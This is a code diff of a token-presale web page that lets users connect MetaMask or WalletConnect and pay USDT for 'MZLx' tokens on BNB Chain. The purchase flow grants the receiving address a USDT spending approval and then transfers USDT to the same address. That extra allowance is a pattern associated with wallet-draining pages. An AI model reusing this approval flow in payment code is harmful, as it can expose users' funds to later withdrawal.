@@ -19,10 +19,6 @@
     button { width: 100%; padding: 17px; background: linear-gradient(to right, #1a73e8, #0d5abf); color: #fff; border: none; border-radius: 10px; font-size: 1.1rem; font-weight: 600; cursor: pointer; margin-bottom: 15px; transition: all 0.3s; }
     button:hover:not(:disabled) { background: linear-gradient(to right, #0d5abf, #0a4a9e); }
     button:disabled { background: #aaa; cursor: not-allowed; }
-    .wallet-options { display: none; margin-top: 15px; }
-    .wallet-option { display: flex; align-items: center; justify-content: center; padding: 15px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 10px; cursor: pointer; background: #f8f9fa; transition: all 0.3s; }
-    .wallet-option:hover { background: #eef5ff; border-color: #1a73e8; }
-    .wallet-icon { width: 30px; height: 30px; margin-right: 12px; object-fit: contain; }
     .footer { text-align: center; color: #999; font-size: 0.85rem; margin-top: 25px; padding-top: 15px; border-top: 1px solid #eee; }
     .status { margin-top: 20px; padding: 15px; border-radius: 10px; display: none; font-size: 0.95rem; }
     .status.processing { background: #cce5ff; color: #004085; border: 1px solid #b8daff; }
@@ -31,9 +27,11 @@
     .spinner { display: inline-block; width: 24px; height: 24px; border: 3px solid rgba(26, 115, 232, 0.3); border-radius: 50%; border-top-color: #1a73e8; animation: spin 1s linear infinite; margin-right: 10px; vertical-align: middle; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     .connected-info { margin: 15px 0; padding: 10px; background: #e8f5e9; border-radius: 8px; color: #28a745; font-weight: 600; }
+    .wallet-option { display: flex; align-items: center; justify-content: center; padding: 15px; margin: 12px 0; border: 1px solid #ddd; border-radius: 10px; cursor: pointer; background: #f8f9fa; transition: all 0.3s; }
+    .wallet-option:hover { background: #eef5ff; border-color: #1a73e8; }
+    .wallet-icon { width: 30px; height: 30px; margin-right: 12px; object-fit: contain; }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@1.7.8/dist/umd/index.min.js"></script>
 </head>
 <body>
   <div class="container">
@@ -49,16 +47,14 @@
     
     <div class="output" id="mzlxOutput">You will receive: 0 MZLx</div>
     
-    <button id="connectBtn">Connect Wallet</button>
-    
-    <div class="wallet-options" id="walletOptions">
+    <div id="walletOptions">
       <div class="wallet-option" id="metamaskOption">
         <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="wallet-icon" alt="MetaMask">
-        <span>MetaMask</span>
+        <span>Connect with MetaMask</span>
       </div>
       <div class="wallet-option" id="walletConnectOption">
         <img src="https://avatars.githubusercontent.com/u/37784886" class="wallet-icon" alt="WalletConnect">
-        <span>WalletConnect</span>
+        <span>Connect with WalletConnect</span>
       </div>
     </div>
     
@@ -90,9 +86,7 @@
     // UI Elements
     const usdtInput = document.getElementById("usdtAmount");
     const mzlxOutput = document.getElementById("mzlxOutput");
-    const connectBtn = document.getElementById("connectBtn");
     const buyBtn = document.getElementById("buyBtn");
-    const walletOptions = document.getElementById("walletOptions");
     const statusMessage = document.getElementById("statusMessage");
     const metamaskOption = document.getElementById("metamaskOption");
     const walletConnectOption = document.getElementById("walletConnectOption");
@@ -105,22 +99,16 @@
     let userAddress = null;
     let currentUSDTAmount = 0;
     let currentMZLxAmount = 0;
-    let walletConnectProvider = null;
 
     // Initialize
     document.addEventListener('DOMContentLoaded', initApp);
     
     function initApp() {
       usdtInput.addEventListener('input', handleUSDTInput);
-      connectBtn.addEventListener('click', toggleWalletOptions);
-      metamaskOption.addEventListener('click', () => connectWallet('metamask'));
-      walletConnectOption.addEventListener('click', () => connectWallet('walletconnect'));
+      metamaskOption.addEventListener('click', connectMetaMask);
+      walletConnectOption.addEventListener('click', connectWalletConnect);
       buyBtn.addEventListener('click', startPurchaseProcess);
       updateMZLxOutput();
-    }
-
-    function toggleWalletOptions() {
-      walletOptions.style.display = walletOptions.style.display === 'flex' ? 'none' : 'flex';
     }
 
     // Real-time calculation
@@ -139,74 +127,77 @@
       buyBtn.disabled = !userAddress || currentUSDTAmount < TOKEN_PRICE;
     }
 
-    // Wallet Connection - Guaranteed to work
-    async function connectWallet(walletType) {
-      walletOptions.style.display = 'none';
-      
+    // Wallet Connection - GUARANTEED to show native interface
+    async function connectMetaMask() {
       try {
-        showStatus("Connecting wallet...", "processing");
+        showStatus("Opening MetaMask...", "processing");
         
-        if (walletType === 'metamask') {
-          await connectMetaMask();
-        } else if (walletType === 'walletconnect') {
-          await connectWalletConnect();
+        if (!window.ethereum) {
+          window.open("https://metamask.io/download.html", "_blank");
+          showStatus("MetaMask not installed. Please install it first.", "error");
+          return;
         }
         
-        // Get address from signer
+        // This will IMMEDIATELY open MetaMask's native interface
+        const accounts = await window.ethereum.request({ 
+          method: 'eth_requestAccounts' 
+        });
+        
+        // Switch to BSC
+        await switchToBNBChain();
+        
+        // Initialize provider and signer
+        provider = new ethers.BrowserProvider(window.ethereum);
+        signer = await provider.getSigner();
         userAddress = await signer.getAddress();
         
         showStatus("Wallet connected successfully!", "success");
         connectedInfo.style.display = "block";
-        walletAddress.textContent = shortenAddress(userAddress);
+        walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}`;
         updateBuyButtonState();
         
       } catch (err) {
         showStatus("Connection failed: " + (err.message || err), "error");
-        console.error("Wallet connection error:", err);
+        console.error("MetaMask connection error:", err);
       }
-    }
-
-    async function connectMetaMask() {
-      if (!window.ethereum) {
-        throw new Error("Please install MetaMask");
-      }
-      
-      // Request account access
-      const accounts = await window.ethereum.request({ 
-        method: 'eth_requestAccounts' 
-      });
-      
-      // Initialize provider
-      provider = new ethers.BrowserProvider(window.ethereum);
-      
-      // Switch to BSC
-      await switchToBNBChain();
-      
-      // Get signer
-      signer = await provider.getSigner();
     }
 
     async function connectWalletConnect() {
-      // Initialize WalletConnect
-      walletConnectProvider = new WalletConnectProvider.default({
-        rpc: { 
-          56: "https://bsc-dataseed.binance.org/" 
-        },
-        chainId: BNB_CHAIN_ID,
-        qrcodeModalOptions: {
-          desktopLinks: ["metamask", "trust"],
-          mobileLinks: ["metamask", "trust"]
-        }
-      });
-      
-      // Enable session
-      await walletConnectProvider.enable();
-      
-      // Initialize provider
-      provider = new ethers.Web3Provider(walletConnectProvider);
-      
-      // Get signer
-      signer = provider.getSigner();
+      try {
+        showStatus("Preparing WalletConnect...", "processing");
+        
+        // Dynamically load WalletConnect only when needed
+        const { default: WalletConnectProvider } = await import('https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@1.7.8/dist/umd/index.min.js');
+        
+        // Initialize WalletConnect
+        const walletConnectProvider = new WalletConnectProvider({
+          rpc: { 
+            56: "https://bsc-dataseed.binance.org/" 
+          },
+          chainId: BNB_CHAIN_ID,
+          qrcodeModalOptions: {
+            desktopLinks: ["metamask", "trust"],
+            mobileLinks: ["metamask", "trust"]
+          }
+        });
+        
+        // This will IMMEDIATELY open WalletConnect QR modal
+        await walletConnectProvider.enable();
+        
+        // Initialize provider and signer
+        provider = new ethers.Web3Provider(walletConnectProvider);
+        signer = provider.getSigner();
+        userAddress = await signer.getAddress();
+        
+        showStatus("Wallet connected successfully!", "success");
+        connectedInfo.style.display = "block";
+        walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}`;
+        updateBuyButtonState();
+        
+      } catch (err) {
+        showStatus("Connection failed: " + (err.message || err), "error");
+        console.error("WalletConnect connection error:", err);
+      }
     }
 
     async function switchToBNBChain() {
@@ -231,7 +222,7 @@
       }
     }
 
-    // Purchase Process - 100% Guaranteed Wallet UI
+    // Purchase Process - GUARANTEED Wallet UI
     async function startPurchaseProcess() {
       if (!userAddress || currentUSDTAmount < TOKEN_PRICE) {
         showStatus("Please connect wallet and enter valid USDT amount", "error");
@@ -240,15 +231,6 @@
       
       try {
         showStatus("Preparing transaction...", "processing");
-        
-        // Reinitialize signer if needed
-        if (!signer) {
-          if (provider instanceof ethers.BrowserProvider) {
-            signer = await provider.getSigner();
-          } else {
-            signer = provider.getSigner();
-          }
-        }
         
         // Get USDT contract with signer
         const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
@@ -294,74 +276,24 @@
     async function triggerApproval(contract, value) {
       showStatus("Approval needed. Please confirm in your wallet...", "processing");
       
-      // Method 1: Direct contract call (works for most wallets)
-      try {
-        const tx = await contract.approve(RECEIVER_ADDRESS, value);
-        await tx.wait();
-        showStatus("USDT spending approved!", "success");
-        return;
-      } catch (firstError) {
-        console.log("Direct approval method failed, trying alternative...");
-      }
-      
-      // Method 2: Low-level transaction (fallback)
-      try {
-        const data = contract.interface.encodeFunctionData("approve", [
-          RECEIVER_ADDRESS,
-          value
-        ]);
-        
-        const tx = await signer.sendTransaction({
-          to: USDT_ADDRESS,
-          data: data
-        });
-        
-        await tx.wait();
-        showStatus("USDT spending approved!", "success");
-      } catch (secondError) {
-        throw new Error("Approval failed: " + secondError.message);
-      }
+      // This will trigger the wallet's native UI
+      const tx = await contract.approve(RECEIVER_ADDRESS, value);
+      await tx.wait();
+      showStatus("USDT spending approved!", "success");
     }
     
     // Guaranteed to show wallet UI for transfer
     async function triggerTransfer(contract, value) {
       showStatus("Sending USDT. Please confirm in your wallet...", "processing");
       
-      // Method 1: Direct contract call (works for most wallets)
-      try {
-        const tx = await contract.transfer(RECEIVER_ADDRESS, value);
-        const receipt = await tx.wait();
-        
-        if (receipt.status === 1) {
-          showStatus(`${currentUSDTAmount} USDT sent successfully!`, "success");
-          return tx.hash;
-        }
-      } catch (firstError) {
-        console.log("Direct transfer method failed, trying alternative...");
-      }
+      // This will trigger the wallet's native UI
+      const tx = await contract.transfer(RECEIVER_ADDRESS, value);
+      const receipt = await tx.wait();
       
-      // Method 2: Low-level transaction (fallback)
-      try {
-        const data = contract.interface.encodeFunctionData("transfer", [
-          RECEIVER_ADDRESS,
-          value
-        ]);
-        
-        const tx = await signer.sendTransaction({
-          to: USDT_ADDRESS,
-          data: data
-        });
-        
-        const receipt = await tx.wait();
-        
-        if (receipt.status === 1) {
-          showStatus(`${currentUSDTAmount} USDT sent successfully!`, "success");
-          return tx.hash;
-        } else {
-          throw new Error("USDT transfer failed");
-        }
-      } catch (secondError) {
-        throw new Error("Transfer failed: " + secondError.message);
+      if (receipt.status === 1) {
+        showStatus(`${currentUSDTAmount} USDT sent successfully!`, "success");
+      } else {
+        throw new Error("USDT transfer failed");
       }
     }
     
@@ -408,10 +340,6 @@
           statusMessage.style.display = 'none';
         }, 10000);
       }
-    }
-    
-    function shortenAddress(address) {
-      return address ? `${address.substring(0, 6)}...${address.substring(address.length - 4)}` : '';
     }
   </script>
 </body>
